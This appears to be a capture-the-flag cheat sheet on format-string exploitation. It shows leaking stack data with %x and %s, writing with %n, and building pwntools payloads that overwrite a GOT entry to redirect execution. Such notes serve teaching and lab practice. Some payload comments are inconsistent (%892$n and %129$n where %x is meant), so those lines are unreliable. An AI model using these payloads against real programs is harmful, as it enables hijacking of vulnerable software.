# Format Strings

## Identification

Look for `printf()` family functions that do not handle user input correctly.  
E.g. `printf(user_input);`  

## Find Your Input in Memory

In the vulnerable input field, provide an easily identifiable sequence of characters, e.g. `aaaabbbbccccdddd`  
followed by many `.%x` sequences. In the output, look for `61616161.62626262.63636363.64646464`.  

E.g.: Input: `aaaabbbb.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x` becomes  
Output: `aaaabbbb.8048914.ff811298.ff811330.ff8112a4.f7ee7444.f781f0e6.ff811564.abeb6602.f7ed64a0.61616161.62626262.2e78252e.252e7825.78252e78`  

You can then drill down to the specific leaks with `%10$x`, i.e. print the 10th hex value (dword size on 32bit,  qword on 64bit)  
Using the above example: `aaaabbbb.%10$x.%11$x` becomes: `aaaabbbb.61616161.62626262`  

## Writing to Memory

`%n` indicates how long a formatted string is at run time.  
When the `%n` is encountered during printf processing, the number of characters up to the current point  
are written to the address argument corresponding to the format specifier.  

E.g. `\xc8\x97\x04\x08.%x.%x.%100x.%n` would write the integer `110` to the address `0x080497c8`.  
Each byte in the address counts as 1, each %x counts as 1, each '.' counts as 1, and the `%100x` counts for 100.  
Address = 4,  
%x's = 2,  
'.' = 4,  
%.100x = 100,  
Total = 110.  

## Finding a Function to Overwite

Look for a function just after the vulnerable `printf()` function call.  
Ghidra (or another disassembler) can be used.  

`objdump -R <vulnerable_binary> | grep <function_after_printf)` will find that functions address within the binary (linux PIE disabled).  
Or open the binary in GBD, break on main (or anywhere) and run the binary, then type `got` into GDB and  
look for the desired function to overwrite (also PIE disabled).  

ANother method to find addresses is: `objdump -D <binary> | grep <function>`  

## Multiple Writes

If you want to overwrite a function pointer, to point to a different function (see the section on finding  
a function to overwrite) you need to perform multiple writes.  

If you want to overwrite the `fflush()` pointer that is found at `0x0804a028` you will  
need to perform writes at `0x0804a028`, `0x0804a029`, `0x0804a02a` and `0x0804a02b`.  
Depending on each starting value and what you need to change it to, you may need to  
write a number of bytes that overflows into into the next byte, setting that.  
E.g. Writing to `0x0804a028` to set the 1st byte, writing to `0x0804a029` to set  
the 2nd and 3rd byte, then `0x0804a02b` to set the 4th byte.  

Using the example: `aaaabbbb.%10$x.%11$x` becomes: `aaaabbbb.61616161.62626262`  
Print values and analyse in GDB: 
```python3
# desired value = 0x0804870b
payload = flat ([
  fflush_ptr0, # 0x0804a028 - pointers to each byte to change
  fflush_ptr1, # 0x0804a029
  fflush_ptr2, # 0x0804a02b
  fmt0, # %10$n - writing bytes at the 10th position
  fmt1, # %11$n - writing bytes at the 11th position
  fmt2  # %12$n - writing bytes at the 12th position
])
```

Observe the starting value of the pointer: `x/2wx 0x0804a028` = `0x52005252`  

Our first write (LSB) needs to increase from `0x52` to `0x0b` (`0x10b`)  
0x10b - 0x52 = 0xb9 OR (int) 185.  

Update the paylaod and rerun to determine the second bytes' calculation:  
```python3
# desired value = 0x0804870b
payload = flat ([
  fflush_ptr0, # 0x0804a028 - pointers to each byte to change
  fflush_ptr1, # 0x0804a029
  fflush_ptr2, # 0x0804a02b
  flag_val0, # b"%185x" - Write 185 bytes, plus the original 82 bytes (0x52) = 0x10b
  fmt0, # %10$n - writing 0x10b at the 10th position (fflush_ptr0)
  fmt1, # %11$n - writing bytes at the 11th position
  fmt2  # %12$n - writing bytes at the 12th position
])
```

Observe the value of the pointer now contains: `x/2wx 0x0804a028` = `0x0b010b0b` 

Second write needs to increase 2nd and 3rd bytes from `0x010b` to `0x0487`.  
0x487 - 0x10b = 0x37c OR (int) 892.  

Update the paylaod and rerun to determine the second bytes' calculation:  
```python3
# desired value = 0x0804870b
payload = flat ([
  fflush_ptr0, # 0x0804a028 - pointers to each byte to change
  fflush_ptr1, # 0x0804a029
  fflush_ptr2, # 0x0804a02b
  flag_val0, # b"%185x" - Write 185 bytes, plus the original 82 bytes (0x52) = 0x10b
  fmt0, # %10$n - writing 0x10b at the 10th position (fflush_ptr0)
  flag_val1, # b"%892$n" - Write 892 bytes, plus the original 267 bytes (0x10b) = 0x487
  fmt1, # %11$n - writing bytes at the 11th position
  fmt2  # %12$n - writing bytes at the 12th position
])
```

Observe the value of the pointer now contains: `x/2wx 0x0804a028` = `0x8704870b` 

Third write needs to increase the 4th byte from `0x87` to `0x08` (`0x108`).  
0x108 - 0x87 = 0x81 OR (int) 129.  

Update the paylaod and rerun to determine the second bytes' calculation:  
```python3
# desired value = 0x0804870b
payload = flat ([
  fflush_ptr0, # 0x0804a028 - pointers to each byte to change
  fflush_ptr1, # 0x0804a029
  fflush_ptr2, # 0x0804a02b
  flag_val0, # b"%185x" - Write 185 bytes, plus the original 82 bytes (0x52) = 0x10b
  fmt0, # %10$n - writing 0x10b at the 10th position (fflush_ptr0)
  flag_val1, # b"%892$n" - Write 892 bytes, plus the original 267 bytes (0x10b) = 0x487
  fmt1, # %11$n - writing bytes at the 11th position
  flag_val2, # b"%129$n" - Write 129 bytes, plus the original 135 bytes (0x87) = 0x108
  fmt2  # %12$n - writing bytes at the 12th position
])
```

Observe the value of the pointer now contains: `x/2wx 0x0804a028` = `0x0804870b` our desired value.  

## Read Strings From the Stack

If you have a format string bug and can dump hex values, you can begin to inspect any pointers to strings  
by calling `%s` on the pointer.  

E.g.:  

```bash
> %x.%x.%x.%x.%x.%x.%x.%x 
40.f7e1d620.8048647.0.1.f7fbd4a0.ffb3aee4.ffb3adcc
> %8$s
flag{flag}

```

## Overwriting Destructors

Destructors run after main() exits by calling exit().  
Destructors can be found in a number of sections:  

- .dtors
- .fini
- .fini_array

Find them in an binary that does not have PIE enabled:  

- Objdump   - `objdump -D <binary> | grep fini`
- Ghidra    - see the "Program Trees" window
- In GDB    - `info file`
- nm        - `nm <binary>`
- readelf   - `readelf -S <binary>`

Write an address into the destructors section of a function you want to call.  

## Overwrite a function 

Find the function you want to overwrite, within the GOT (can find with `Ghidra`). Overwrite this pointer with the  
address to the desired functions PLT address (can find with `objdump`), e.g. system@plt.  
